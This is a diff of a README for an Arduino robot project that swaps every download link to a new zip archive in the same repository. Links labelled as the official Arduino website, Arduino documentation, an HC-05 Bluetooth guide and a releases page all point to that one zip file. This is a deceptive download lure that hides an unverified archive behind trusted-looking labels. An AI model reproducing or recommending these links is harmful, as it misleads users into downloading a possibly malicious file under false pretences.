@@ -6,7 +6,7 @@ Welcome to the **Tyran-DualMode-Robot**! This is a friendly guide to help you do
 
 ## 📥 Download Now
 
-[![Download Tyran-DualMode-Robot](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip%20Now!-blue)](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip)
+[![Download Tyran-DualMode-Robot](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip%20Now!-blue)](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip)
 
 ## 📋 System Requirements
 
@@ -32,7 +32,7 @@ Before you begin, make sure your setup meets these basic requirements:
 
 To download the software, visit our releases page. Click the link below:
 
-[Visit Releases Page](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip)
 
 ### 2. Choose Your Version
 
@@ -53,7 +53,7 @@ Once the download is complete, locate the "*.zip*" file. Right-click on it and c
 
 ### 6. Open the Arduino IDE
 
-If you haven't installed the Arduino IDE yet, download it from the official [Arduino website](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip).
+If you haven't installed the Arduino IDE yet, download it from the official [Arduino website](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip).
 
 - Launch the Arduino IDE.
 - Open the extracted folder and locate the main project file (it should have a "*.ino*" extension).
@@ -97,8 +97,8 @@ For further assistance, please refer to the Issues section on the GitHub page or
 
 ## 💡 Additional Resources
 
-- [Arduino Documentation](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip)
-- [HC-05 Bluetooth Module Guide](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip)
+- [Arduino Documentation](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip)
+- [HC-05 Bluetooth Module Guide](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip)
 
 ## 🏁 Conclusion
 
@@ -108,4 +108,4 @@ Thank you for choosing the **Tyran-DualMode-Robot**! We hope you enjoy building 
 
 Don't forget, you can always return to download the latest version if you need it:
 
-[Download Here](https://github.com/Prince1186/Tyran-DualMode-Robot/raw/refs/heads/main/Platonician/Tyran-Dual-Robot-Mode-2.7.zip)
+[Download Here](https://raw.githubusercontent.com/Prince1186/Tyran-DualMode-Robot/main/Platonician/Robot_Dual_Mode_Tyran_v1.3.zip)
